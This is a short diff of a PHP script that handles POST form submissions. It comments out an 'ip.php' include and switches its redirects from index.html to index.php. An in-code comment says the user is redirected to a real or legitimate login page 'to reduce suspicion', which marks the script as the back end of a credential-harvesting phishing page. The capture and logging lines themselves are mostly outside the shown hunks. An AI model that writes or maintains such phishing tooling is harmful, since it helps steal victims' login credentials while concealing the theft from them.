@@ -1,5 +1,5 @@
 <?php
-include __DIR__ . "/ip.php";
+#include __DIR__ . "/ip.php";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     
@@ -20,11 +20,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     //echo nl2br(htmlspecialchars($log_line));
 
     // Redirect user to a real site (e.g. legitimate login page) to reduce suspicion
-    header("Location: index.html");
+    header("Location: index.php");
     exit();
 } else {
     // If accessed directly without POST, redirect to index.html
-    header("Location: index.html");
+    header("Location: index.php");
     exit();
 }
 ?>
